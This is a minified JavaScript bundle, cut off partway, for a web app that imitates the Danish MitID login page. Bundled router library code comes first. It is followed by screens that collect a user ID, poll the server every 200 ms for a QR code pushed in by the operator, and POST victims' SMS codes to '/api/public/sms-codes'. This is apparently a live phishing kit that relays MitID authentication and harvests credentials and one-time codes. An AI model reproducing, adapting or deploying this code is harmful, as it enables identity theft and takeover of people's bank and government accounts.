import {r as de, a as p, R as ue, c as I, j as l, b as V, Q as W, C as he, d as fe} from "./browser-QtzkJKuE.js";
de();
function O() {
    return O = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }
    ,
    O.apply(this, arguments)
}
var R;
(function(e) {
    e.Pop = "POP",
    e.Push = "PUSH",
    e.Replace = "REPLACE"
}
)(R || (R = {}));
const q = "popstate";
function pe(e) {
    e === void 0 && (e = {});
    function t(s, o) {
        let {pathname: i="/", search: d="", hash: a=""} = P(s.location.hash.substr(1));
        return !i.startsWith("/") && !i.startsWith(".") && (i = "/" + i),
        U("", {
            pathname: i,
            search: d,
            hash: a
        }, o.state && o.state.usr || null, o.state && o.state.key || "default")
    }
    function n(s, o) {
        let i = s.document.querySelector("base")
          , d = "";
        if (i && i.getAttribute("href")) {
            let a = s.location.href
              , h = a.indexOf("#");
            d = h === -1 ? a : a.slice(0, h)
        }
        return d + "#" + (typeof o == "string" ? o : Z(o))
    }
    function r(s, o) {
        F(s.pathname.charAt(0) === "/", "relative pathnames are not supported in hash history.push(" + JSON.stringify(o) + ")")
    }
    return ge(t, n, r, e)
}
function C(e, t) {
    if (e === !1 || e === null || typeof e > "u")
        throw new Error(t)
}
function F(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t)
        } catch {}
    }
}
function me() {
    return Math.random().toString(36).substr(2, 8)
}
function Q(e, t) {
    return {
        usr: e.state,
        key: e.key,
        idx: t
    }
}
function U(e, t, n, r) {
    return n === void 0 && (n = null),
    O({
        pathname: typeof e == "string" ? e : e.pathname,
        search: "",
        hash: ""
    }, typeof t == "string" ? P(t) : t, {
        state: n,
        key: t && t.key || r || me()
    })
}
function Z(e) {
    let {pathname: t="/", search: n="", hash: r=""} = e;
    return n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n),
    r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r),
    t
}
function P(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && (t.hash = e.substr(n),
        e = e.substr(0, n));
        let r = e.indexOf("?");
        r >= 0 && (t.search = e.substr(r),
        e = e.substr(0, r)),
        e && (t.pathname = e)
    }
    return t
}
function ge(e, t, n, r) {
    r === void 0 && (r = {});
    let {window: s=document.defaultView, v5Compat: o=!1} = r
      , i = s.history
      , d = R.Pop
      , a = null
      , h = f();
    h == null && (h = 0,
    i.replaceState(O({}, i.state, {
        idx: h
    }), ""));
    function f() {
        return (i.state || {
            idx: null
        }).idx
    }
    function c() {
        d = R.Pop;
        let u = f()
          , g = u == null ? null : u - h;
        h = u,
        a && a({
            action: d,
            location: y.location,
            delta: g
        })
    }
    function m(u, g) {
        d = R.Push;
        let x = U(y.location, u, g);
        n && n(x, u),
        h = f() + 1;
        let v = Q(x, h)
          , E = y.createHref(x);
        try {
            i.pushState(v, "", E)
        } catch (w) {
            if (w instanceof DOMException && w.name === "DataCloneError")
                throw w;
            s.location.assign(E)
        }
        o && a && a({
            action: d,
            location: y.location,
            delta: 1
        })
    }
    function j(u, g) {
        d = R.Replace;
        let x = U(y.location, u, g);
        n && n(x, u),
        h = f();
        let v = Q(x, h)
          , E = y.createHref(x);
        i.replaceState(v, "", E),
        o && a && a({
            action: d,
            location: y.location,
            delta: 0
        })
    }
    function b(u) {
        let g = s.location.origin !== "null" ? s.location.origin : s.location.href
          , x = typeof u == "string" ? u : Z(u);
        return x = x.replace(/ $/, "%20"),
        C(g, "No window.location.(origin|href) available to create URL for href: " + x),
        new URL(x,g)
    }
    let y = {
        get action() {
            return d
        },
        get location() {
            return e(s, i)
        },
        listen(u) {
            if (a)
                throw new Error("A history only accepts one active listener");
            return s.addEventListener(q, c),
            a = u,
            () => {
                s.removeEventListener(q, c),
                a = null
            }
        },
        createHref(u) {
            return t(s, u)
        },
        createURL: b,
        encodeLocation(u) {
            let g = b(u);
            return {
                pathname: g.pathname,
                search: g.search,
                hash: g.hash
            }
        },
        push: m,
        replace: j,
        go(u) {
            return i.go(u)
        }
    };
    return y
}
var z;
(function(e) {
    e.data = "data",
    e.deferred = "deferred",
    e.redirect = "redirect",
    e.error = "error"
}
)(z || (z = {}));
function xe(e, t, n) {
    return n === void 0 && (n = "/"),
    ve(e, t, n)
}
function ve(e, t, n, r) {
    let s = typeof t == "string" ? P(t) : t
      , o = te(s.pathname || "/", n);
    if (o == null)
        return null;
    let i = Y(e);
    we(i);
    let d = null;
    for (let a = 0; d == null && a < i.length; ++a) {
        let h = Me(o);
        d = ke(i[a], h)
    }
    return d
}
function Y(e, t, n, r) {
    t === void 0 && (t = []),
    n === void 0 && (n = []),
    r === void 0 && (r = "");
    let s = (o, i, d) => {
        let a = {
            relativePath: d === void 0 ? o.path || "" : d,
            caseSensitive: o.caseSensitive === !0,
            childrenIndex: i,
            route: o
        };
        a.relativePath.startsWith("/") && (C(a.relativePath.startsWith(r), 'Absolute route path "' + a.relativePath + '" nested under path ' + ('"' + r + '" is not valid. An absolute child route path ') + "must start with the combined path of all its parent routes."),
        a.relativePath = a.relativePath.slice(r.length));
        let h = k([r, a.relativePath])
          , f = n.concat(a);
        o.children && o.children.length > 0 && (C(o.index !== !0, "Index routes must not have child routes. Please remove " + ('all child routes from route path "' + h + '".')),
        Y(o.children, t, f, h)),
        !(o.path == null && !o.index) && t.push({
            path: h,
            score: Ee(h, o.index),
            routesMeta: f
        })
    }
    ;
    return e.forEach( (o, i) => {
        var d;
        if (o.path === "" || !((d = o.path) != null && d.includes("?")))
            s(o, i);
        else
            for (let a of ee(o.path))
                s(o, i, a)
    }
    ),
    t
}
function ee(e) {
    let t = e.split("/");
    if (t.length === 0)
        return [];
    let[n,...r] = t
      , s = n.endsWith("?")
      , o = n.replace(/\?$/, "");
    if (r.length === 0)
        return s ? [o, ""] : [o];
    let i = ee(r.join("/"))
      , d = [];
    return d.push(...i.map(a => a === "" ? o : [o, a].join("/"))),
    s && d.push(...i),
    d.map(a => e.startsWith("/") && a === "" ? "/" : a)
}
function we(e) {
    e.sort( (t, n) => t.score !== n.score ? n.score - t.score : Re(t.routesMeta.map(r => r.childrenIndex), n.routesMeta.map(r => r.childrenIndex)))
}
const be = /^:[\w-]+$/
  , ye = 3
  , je = 2
  , Se = 1
  , Ce = 10
  , Ne = -2
  , G = e => e === "*";
function Ee(e, t) {
    let n = e.split("/")
      , r = n.length;
    return n.some(G) && (r += Ne),
    t && (r += je),
    n.filter(s => !G(s)).reduce( (s, o) => s + (be.test(o) ? ye : o === "" ? Se : Ce), r)
}
function Re(e, t) {
    return e.length === t.length && e.slice(0, -1).every( (r, s) => r === t[s]) ? e[e.length - 1] - t[t.length - 1] : 0
}
function ke(e, t, n) {
    let {routesMeta: r} = e
      , s = {}
      , o = "/"
      , i = [];
    for (let d = 0; d < r.length; ++d) {
        let a = r[d]
          , h = d === r.length - 1
          , f = o === "/" ? t : t.slice(o.length) || "/"
          , c = Pe({
            path: a.relativePath,
            caseSensitive: a.caseSensitive,
            end: h
        }, f)
          , m = a.route;
        if (!c)
            return null;
        Object.assign(s, c.params),
        i.push({
            params: s,
            pathname: k([o, c.pathname]),
            pathnameBase: Ie(k([o, c.pathnameBase])),
            route: m
        }),
        c.pathnameBase !== "/" && (o = k([o, c.pathnameBase]))
    }
    return i
}
function Pe(e, t) {
    typeof e == "string" && (e = {
        path: e,
        caseSensitive: !1,
        end: !0
    });
    let[n,r] = Oe(e.path, e.caseSensitive, e.end)
      , s = t.match(n);
    if (!s)
        return null;
    let o = s[0]
      , i = o.replace(/(.)\/+$/, "$1")
      , d = s.slice(1);
    return {
        params: r.reduce( (h, f, c) => {
            let {paramName: m, isOptional: j} = f;
            if (m === "*") {
                let y = d[c] || "";
                i = o.slice(0, o.length - y.length).replace(/(.)\/+$/, "$1")
            }
            const b = d[c];
            return j && !b ? h[m] = void 0 : h[m] = (b || "").replace(/%2F/g, "/"),
            h
        }
        , {}),
        pathname: o,
        pathnameBase: i,
        pattern: e
    }
}
function Oe(e, t, n) {
    t === void 0 && (t = !1),
    n === void 0 && (n = !0),
    F(e === "*" || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were ' + ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + e.replace(/\*$/, "/*") + '".'));
    let r = []
      , s = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (i, d, a) => (r.push({
        paramName: d,
        isOptional: a != null
    }),
    a ? "/?([^\\/]+)?" : "/([^\\/]+)"));
    return e.endsWith("*") ? (r.push({
        paramName: "*"
    }),
    s += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? s += "\\/*$" : e !== "" && e !== "/" && (s += "(?:(?=\\/|$))"),
    [new RegExp(s,t ? void 0 : "i"), r]
}
function Me(e) {
    try {
        return e.split("/").map(t => decodeURIComponent(t).replace(/\//g, "%2F")).join("/")
    } catch (t) {
        return F(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' + ("encoding (" + t + ").")),
        e
    }
}
function te(e, t) {
    if (t === "/")
        return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase()))
        return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length
      , r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/"
}
const k = e => e.join("/").replace(/\/\/+/g, "/")
  , Ie = e => e.replace(/\/+$/, "").replace(/^\/*/, "/");
function $e(e) {
    return e != null && typeof e.status == "number" && typeof e.statusText == "string" && typeof e.internal == "boolean" && "data"in e
}
const ne = ["post", "put", "patch", "delete"];
new Set(ne);
const De = ["get", ...ne];
new Set(De);
function M() {
    return M = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }
    ,
    M.apply(this, arguments)
}
const Le = p.createContext(null)
  , Be = p.createContext(null)
  , re = p.createContext(null)
  , $ = p.createContext(null)
  , D = p.createContext({
    outlet: null,
    matches: [],
    isDataRoute: !1
})
  , ae = p.createContext(null);
function _() {
    return p.useContext($) != null
}
function Ue() {
    return _() || C(!1),
    p.useContext($).location
}
function Te(e, t) {
    return Fe(e, t)
}
function Fe(e, t, n, r) {
    _() || C(!1);
    let {navigator: s} = p.useContext(re)
      , {matches: o} = p.useContext(D)
      , i = o[o.length - 1]
      , d = i ? i.params : {};
    i && i.pathname;
    let a = i ? i.pathnameBase : "/";
    i && i.route;
    let h = Ue(), f;
    if (t) {
        var c;
        let u = typeof t == "string" ? P(t) : t;
        a === "/" || (c = u.pathname) != null && c.startsWith(a) || C(!1),
        f = u
    } else
        f = h;
    let m = f.pathname || "/"
      , j = m;
    if (a !== "/") {
        let u = a.replace(/^\//, "").split("/");
        j = "/" + m.replace(/^\//, "").split("/").slice(u.length).join("/")
    }
    let b = xe(e, {
        pathname: j
    })
      , y = qe(b && b.map(u => Object.assign({}, u, {
        params: Object.assign({}, d, u.params),
        pathname: k([a, s.encodeLocation ? s.encodeLocation(u.pathname).pathname : u.pathname]),
        pathnameBase: u.pathnameBase === "/" ? a : k([a, s.encodeLocation ? s.encodeLocation(u.pathnameBase).pathname : u.pathnameBase])
    })), o, n, r);
    return t && y ? p.createElement($.Provider, {
        value: {
            location: M({
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default"
            }, f),
            navigationType: R.Pop
        }
    }, y) : y
}
function _e() {
    let e = He()
      , t = $e(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e)
      , n = e instanceof Error ? e.stack : null
      , s = {
        padding: "0.5rem",
        backgroundColor: "rgba(200,200,200, 0.5)"
    };
    return p.createElement(p.Fragment, null, p.createElement("h2", null, "Unexpected Application Error!"), p.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, t), n ? p.createElement("pre", {
        style: s
    }, n) : null, null)
}
const Ae = p.createElement(_e, null);
class Ve extends p.Component {
    constructor(t) {
        super(t),
        this.state = {
            location: t.location,
            revalidation: t.revalidation,
            error: t.error
        }
    }
    static getDerivedStateFromError(t) {
        return {
            error: t
        }
    }
    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || n.revalidation !== "idle" && t.revalidation === "idle" ? {
            error: t.error,
            location: t.location,
            revalidation: t.revalidation
        } : {
            error: t.error !== void 0 ? t.error : n.error,
            location: n.location,
            revalidation: t.revalidation || n.revalidation
        }
    }
    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n)
    }
    render() {
        return this.state.error !== void 0 ? p.createElement(D.Provider, {
            value: this.props.routeContext
        }, p.createElement(ae.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}
function We(e) {
    let {routeContext: t, match: n, children: r} = e
      , s = p.useContext(Le);
    return s && s.static && s.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (s.staticContext._deepestRenderedBoundaryId = n.route.id),
    p.createElement(D.Provider, {
        value: t
    }, r)
}
function qe(e, t, n, r) {
    var s;
    if (t === void 0 && (t = []),
    n === void 0 && (n = null),
    r === void 0 && (r = null),
    e == null) {
        var o;
        if (!n)
            return null;
        if (n.errors)
            e = n.matches;
        else if ((o = r) != null && o.v7_partialHydration && t.length === 0 && !n.initialized && n.matches.length > 0)
            e = n.matches;
        else
            return null
    }
    let i = e
      , d = (s = n) == null ? void 0 : s.errors;
    if (d != null) {
        let f = i.findIndex(c => c.route.id && d?.[c.route.id] !== void 0);
        f >= 0 || C(!1),
        i = i.slice(0, Math.min(i.length, f + 1))
    }
    let a = !1
      , h = -1;
    if (n && r && r.v7_partialHydration)
        for (let f = 0; f < i.length; f++) {
            let c = i[f];
            if ((c.route.HydrateFallback || c.route.hydrateFallbackElement) && (h = f),
            c.route.id) {
                let {loaderData: m, errors: j} = n
                  , b = c.route.loader && m[c.route.id] === void 0 && (!j || j[c.route.id] === void 0);
                if (c.route.lazy || b) {
                    a = !0,
                    h >= 0 ? i = i.slice(0, h + 1) : i = [i[0]];
                    break
                }
            }
        }
    return i.reduceRight( (f, c, m) => {
        let j, b = !1, y = null, u = null;
        n && (j = d && c.route.id ? d[c.route.id] : void 0,
        y = c.route.errorElement || Ae,
        a && (h < 0 && m === 0 ? (Ke("route-fallback"),
        b = !0,
        u = null) : h === m && (b = !0,
        u = c.route.hydrateFallbackElement || null)));
        let g = t.concat(i.slice(0, m + 1))
          , x = () => {
            let v;
            return j ? v = y : b ? v = u : c.route.Component ? v = p.createElement(c.route.Component, null) : c.route.element ? v = c.route.element : v = f,
            p.createElement(We, {
                match: c,
                routeContext: {
                    outlet: f,
                    matches: g,
                    isDataRoute: n != null
                },
                children: v
            })
        }
        ;
        return n && (c.route.ErrorBoundary || c.route.errorElement || m === 0) ? p.createElement(Ve, {
            location: n.location,
            revalidation: n.revalidation,
            component: y,
            error: j,
            children: x(),
            routeContext: {
                outlet: null,
                matches: g,
                isDataRoute: !0
            }
        }) : x()
    }
    , null)
}
var oe = (function(e) {
    return e.UseBlocker = "useBlocker",
    e.UseLoaderData = "useLoaderData",
    e.UseActionData = "useActionData",
    e.UseRouteError = "useRouteError",
    e.UseNavigation = "useNavigation",
    e.UseRouteLoaderData = "useRouteLoaderData",
    e.UseMatches = "useMatches",
    e.UseRevalidator = "useRevalidator",
    e.UseNavigateStable = "useNavigate",
    e.UseRouteId = "useRouteId",
    e
}
)(oe || {});
function Qe(e) {
    let t = p.useContext(Be);
    return t || C(!1),
    t
}
function ze(e) {
    let t = p.useContext(D);
    return t || C(!1),
    t
}
function Ge(e) {
    let t = ze()
      , n = t.matches[t.matches.length - 1];
    return n.route.id || C(!1),
    n.route.id
}
function He() {
    var e;
    let t = p.useContext(ae)
      , n = Qe(oe.UseRouteError)
      , r = Ge();
    return t !== void 0 ? t : (e = n.errors) == null ? void 0 : e[r]
}
const H = {};
function Ke(e, t, n) {
    H[e] || (H[e] = !0)
}
function Je(e, t) {
    e?.v7_startTransition,
    e?.v7_relativeSplatPath
}
function ie(e) {
    C(!1)
}
function Xe(e) {
    let {basename: t="/", children: n=null, location: r, navigationType: s=R.Pop, navigator: o, static: i=!1, future: d} = e;
    _() && C(!1);
    let a = t.replace(/^\/*/, "/")
      , h = p.useMemo( () => ({
        basename: a,
        navigator: o,
        static: i,
        future: M({
            v7_relativeSplatPath: !1
        }, d)
    }), [a, d, o, i]);
    typeof r == "string" && (r = P(r));
    let {pathname: f="/", search: c="", hash: m="", state: j=null, key: b="default"} = r
      , y = p.useMemo( () => {
        let u = te(f, a);
        return u == null ? null : {
            location: {
                pathname: u,
                search: c,
                hash: m,
                state: j,
                key: b
            },
            navigationType: s
        }
    }
    , [a, f, c, m, j, b, s]);
    return y == null ? null : p.createElement(re.Provider, {
        value: h
    }, p.createElement($.Provider, {
        children: n,
        value: y
    }))
}
function Ze(e) {
    let {children: t, location: n} = e;
    return Te(T(t), n)
}
new Promise( () => {}
);
function T(e, t) {
    t === void 0 && (t = []);
    let n = [];
    return p.Children.forEach(e, (r, s) => {
        if (!p.isValidElement(r))
            return;
        let o = [...t, s];
        if (r.type === p.Fragment) {
            n.push.apply(n, T(r.props.children, o));
            return
        }
        r.type !== ie && C(!1),
        !r.props.index || !r.props.children || C(!1);
        let i = {
            id: r.props.id || o.join("-"),
            caseSensitive: r.props.caseSensitive,
            element: r.props.element,
            Component: r.props.Component,
            index: r.props.index,
            path: r.props.path,
            loader: r.props.loader,
            action: r.props.action,
            errorElement: r.props.errorElement,
            ErrorBoundary: r.props.ErrorBoundary,
            hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
            shouldRevalidate: r.props.shouldRevalidate,
            handle: r.props.handle,
            lazy: r.props.lazy
        };
        r.props.children && (i.children = T(r.props.children, o)),
        n.push(i)
    }
    ),
    n
}
const Ye = "6";
try {
    window.__reactRouterVersion = Ye
} catch {}
const et = "startTransition"
  , K = ue[et];
function tt(e) {
    let {basename: t, children: n, future: r, window: s} = e
      , o = p.useRef();
    o.current == null && (o.current = pe({
        window: s,
        v5Compat: !0
    }));
    let i = o.current
      , [d,a] = p.useState({
        action: i.action,
        location: i.location
    })
      , {v7_startTransition: h} = r || {}
      , f = p.useCallback(c => {
        h && K ? K( () => a(c)) : a(c)
    }
    , [a, h]);
    return p.useLayoutEffect( () => i.listen(f), [i, f]),
    p.useEffect( () => Je(r), [r]),
    p.createElement(Xe, {
        basename: t,
        children: n,
        location: d.location,
        navigationType: d.action,
        navigator: i,
        future: r
    })
}
var J;
(function(e) {
    e.UseScrollRestoration = "useScrollRestoration",
    e.UseSubmit = "useSubmit",
    e.UseSubmitFetcher = "useSubmitFetcher",
    e.UseFetcher = "useFetcher",
    e.useViewTransitionState = "useViewTransitionState"
}
)(J || (J = {}));
var X;
(function(e) {
    e.UseFetcher = "useFetcher",
    e.UseFetchers = "useFetchers",
    e.UseScrollRestoration = "useScrollRestoration"
}
)(X || (X = {}));
const nt = [["path", {
    d: "M5 12h14",
    key: "1ays0h"
}], ["path", {
    d: "m12 5 7 7-7 7",
    key: "xquz4c"
}]]
  , rt = I("arrow-right", nt);
const at = [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
}]]
  , se = I("check", at);
const ot = [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3",
    key: "1u773s"
}], ["path", {
    d: "M12 17h.01",
    key: "p32p05"
}]]
  , it = I("circle-question-mark", ot);
const st = [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M12 16v-4",
    key: "1dtifu"
}], ["path", {
    d: "M12 8h.01",
    key: "e9boi3"
}]]
  , lt = I("info", st)
  , ct = ({onContinue: e}) => {
    const [t,n] = p.useState("")
      , [r,s] = p.useState(!1)
      , o = t.length > 0
      , i = () => {
        o && e(t)
    }
    ;
    return l.jsx("div", {
        className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans",
        children: l.jsxs("div", {
            className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm",
            children: [l.jsxs("div", {
                className: "flex justify-between items-center px-8 py-6 border-b border-[#d8d8d8]",
                children: [l.jsx("h1", {
                    className: "text-[20px] font-bold text-[#1a1a1a] tracking-tight",
                    children: "Log på hos mitid.dk"
                }), l.jsx("img", {
                    src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
                    alt: "mitid",
                    className: "h-6"
                })]
            }), l.jsxs("div", {
                className: "px-8 py-8",
                children: [l.jsxs("div", {
                    className: "mb-6",
                    children: [l.jsxs("div", {
                        className: "flex items-center gap-2 mb-2",
                        children: [l.jsx("label", {
                            className: "text-[12px] font-bold text-[#1a1a1a] tracking-wide uppercase",
                            children: "Bruger-ID"
                        }), l.jsx(it, {
                            className: "w-4 h-4 text-[#1a1a1a]",
                            strokeWidth: 2
                        })]
                    }), l.jsxs("div", {
                        className: "relative",
                        children: [l.jsx("input", {
                            type: "text",
                            className: "w-full pl-3 pr-12 py-3 border-[2px] border-[#0060e6] rounded-[4px] outline-none text-lg text-[#1a1a1a] bg-[#f5faff]",
                            autoFocus: !0,
                            value: t,
                            onChange: d => n(d.target.value),
                            onKeyDown: d => {
                                d.key === "Enter" && o && i()
                            }
                        }), l.jsx("span", {
                            className: "absolute right-3 top-1/2 -translate-y-1/2 text-[#1a1a1a] text-[15px] cursor-pointer hover:underline",
                            children: "Skjul"
                        })]
                    })]
                }), l.jsxs("button", {
                    className: `w-full text-white font-bold text-[16px] py-3 px-4 rounded-[4px] flex items-center justify-between mb-6 transition-colors ${o ? "bg-[#0060e6] hover:bg-[#004cb8] cursor-pointer" : "bg-[#cccccc] cursor-not-allowed"}`,
                    disabled: !o,
                    onClick: i,
                    children: [l.jsx("span", {
                        className: "flex-1 text-center ml-6",
                        children: "FORTSÆT"
                    }), l.jsx(rt, {
                        className: "w-5 h-5",
                        strokeWidth: 3
                    })]
                }), l.jsxs("div", {
                    className: "flex items-center gap-2 text-[#0060e6] mb-12 group cursor-help",
                    title: "Har du glemt dit bruger-ID, kan du se det ved at scanne dit pas i mitid appen.",
                    children: [l.jsx(lt, {
                        className: "w-6 h-6",
                        strokeWidth: 2
                    }), l.jsx("span", {
                        className: "text-[15px]",
                        children: "Glemt bruger-ID?"
                    })]
                }), l.jsxs("div", {
                    className: "pt-4",
                    children: [l.jsxs("div", {
                        className: "flex items-center gap-3 mb-6 cursor-pointer group select-none",
                        onClick: () => s(!r),
                        children: [l.jsx("div", {
                            className: `w-5 h-5 border-[2px] rounded-[2px] flex items-center justify-center transition-colors ${r ? "bg-[#0060e6] border-[#0060e6]" : "border-[#1a1a1a] group-hover:bg-gray-50"}`,
                            children: r && l.jsx(se, {
                                className: "w-4 h-4 text-white",
                                strokeWidth: 3
                            })
                        }), l.jsx("span", {
                            className: "text-[#001845] font-bold text-[15px]",
                            children: "Husk mig hos mitid.dk"
                        })]
                    }), l.jsx("div", {
                        className: "border-t border-[#d8d8d8] pt-4 text-center",
                        children: l.jsx("a", {
                            href: "#",
                            className: "text-[#0060e6] font-bold text-[15px] hover:underline",
                            children: "Afbryd"
                        })
                    })]
                })]
            })]
        })
    })
}
  , dt = () => l.jsx("div", {
    className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans",
    children: l.jsxs("div", {
        className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm flex flex-col items-center justify-center py-24 min-h-[550px]",
        children: [l.jsx("img", {
            src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
            alt: "mitid",
            className: "h-7 mb-10",
            loading: "eager"
        }), l.jsxs("div", {
            className: "relative mb-10",
            children: [l.jsx("svg", {
                width: "100",
                height: "120",
                viewBox: "0 0 100 120",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                className: "drop-shadow-sm",
                children: l.jsx("path", {
                    d: "M50 0L100 15V60C100 95 50 120 50 120C50 120 0 95 0 60V15L50 0Z",
                    fill: "#0060e6"
                })
            }), l.jsx("div", {
                className: "absolute inset-0 flex items-center justify-center pt-2",
                children: l.jsx("div", {
                    className: "w-12 h-12 border-[4px] border-white/30 border-t-white rounded-full animate-spin"
                })
            })]
        }), l.jsx("h2", {
            className: "text-[20px] font-bold text-[#1a1a1a] mb-2 text-center tracking-tight",
            children: "Forbinder sikkert til mitid"
        }), l.jsx("p", {
            className: "text-[#5c5c5c] text-[15px] font-normal",
            children: "Vent et øjeblik ..."
        })]
    })
})
  , L = "window.location.origin;"
  , ut = ({onCancel: e}) => {
    const [t,n] = p.useState(null)
      , [r,s] = p.useState(null)
      , [o,i] = p.useState(!1)
      , [d,a] = p.useState("")
      , [h,f] = p.useState(!1)
      , [c,m] = p.useState("")
      , j = V.useRef(null);
    p.useEffect( () => {
        const u = new BroadcastChannel("mitid_channel");
        return u.onmessage = g => {
            g.data.type === "sms_toggle" && (j.current = g.data.value,
            i(g.data.value))
        }
        ,
        () => u.close()
    }
    , []),
    p.useEffect( () => {
        const u = async () => {
            try {
                const v = await (await fetch(`${L}/api/public/settings/show-sms`)).json();
                v.showSmsField !== void 0 && v.showSmsField !== j.current && (j.current = v.showSmsField,
                i(v.showSmsField))
            } catch (x) {
                console.error("Failed to fetch SMS settings:", x)
            }
        }
        ;
        u();
        const g = setInterval(u, 200);
        return () => clearInterval(g)
    }
    , []);
    const b = V.useRef(null);
    p.useEffect( () => {
        const u = async () => {
            try {
                const v = await (await fetch(`${L}/api/public/current-qr`)).json();
                if (v.qrData && v.qrData !== b.current) {
                    b.current = v.qrData,
                    s(v.qrData);
                    try {
                        const E = await W.toDataURL(v.qrData, {
                            width: 200,
                            margin: 1
                        });
                        n(E)
                    } catch (E) {
                        console.error("Error generating QR:", E)
                    }
                } else
                    !v.qrData && b.current && (b.current = null,
                    s(null),
                    n(null))
            } catch (x) {
                console.error("Failed to fetch QR:", x)
            }
        }
        ;
        u();
        const g = setInterval(u, 200);
        return () => clearInterval(g)
    }
    , []),
    p.useEffect( () => {
        const u = new BroadcastChannel("mitid_channel");
        return u.onmessage = async g => {
            if (g.data.type === "qr") {
                const x = g.data.value;
                if (b.current = x,
                s(x),
                x)
                    try {
                        const v = await W.toDataURL(x, {
                            width: 200,
                            margin: 1
                        });
                        n(v)
                    } catch (v) {
                        console.error("Error generating QR:", v)
                    }
                else
                    n(null)
            }
        }
        ,
        () => u.close()
    }
    , []);
    const y = async () => {
        if (!d || d.length < 4) {
            m("Indtast venligst en gyldig kode");
            return
        }
        m("");
        try {
            await fetch(`${L}/api/public/sms-codes`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    code: d
                })
            }),
            f(!0),
            a(""),
            setTimeout( () => {
                f(!1)
            }
            , 3e3)
        } catch {
            m("Fejl ved sending. Prøv igen.")
        }
    }
    ;
    return l.jsx("div", {
        className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans",
        children: l.jsxs("div", {
            className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm flex flex-col items-center py-10 min-h-[550px]",
            children: [l.jsx("img", {
                src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
                alt: "mitid",
                className: "h-6 mb-8"
            }), l.jsx("h2", {
                className: "text-[22px] font-bold text-[#1a1a1a] mb-8 tracking-tight",
                children: "Forbinder sikkert"
            }), !o && l.jsx("div", {
                className: "bg-white p-2 mb-8 w-48 h-48 flex items-center justify-center relative",
                children: t ? l.jsx("img", {
                    src: t,
                    alt: "QR Code",
                    className: "w-full h-full object-contain transition-opacity duration-200"
                }) : l.jsxs("div", {
                    className: "flex flex-col items-center justify-center relative",
                    children: [l.jsx("svg", {
                        width: "100",
                        height: "120",
                        viewBox: "0 0 100 120",
                        fill: "none",
                        xmlns: "http://www.w3.org/2000/svg",
                        className: "mb-3",
                        children: l.jsx("path", {
                            d: "M50 0L100 15V60C100 95 50 120 50 120C50 120 0 95 0 60V15L50 0Z",
                            fill: "#0060E6"
                        })
                    }), l.jsx("div", {
                        className: "absolute top-[36px] left-1/2 -translate-x-1/2",
                        children: l.jsx("div", {
                            className: "w-10 h-10 border-[3px] border-white/30 border-t-[#0060e6] rounded-full animate-spin"
                        })
                    }), l.jsx("span", {
                        className: "text-sm font-bold text-[#1a1a1a] mt-1",
                        children: "Venter på QR"
                    })]
                })
            }), !o && l.jsxs("div", {
                className: "text-center px-8 mb-6",
                children: [l.jsx("p", {
                    className: "text-[#1a1a1a] text-[16px] font-bold mb-2",
                    children: "Scan QR-koden"
                }), l.jsx("p", {
                    className: "text-[#1a1a1a] text-[15px]",
                    children: "Brug din mitid app til at scanne koden"
                })]
            }), o && l.jsx("div", {
                className: "w-full max-w-[320px] px-4 mb-6",
                children: l.jsxs("div", {
                    className: "bg-[#f5faff] border border-[#0060e6] rounded-[4px] p-4",
                    children: [l.jsx("label", {
                        className: "text-[12px] font-bold text-[#1a1a1a] uppercase tracking-wide mb-2 block",
                        children: "SMS-Bekræftelse"
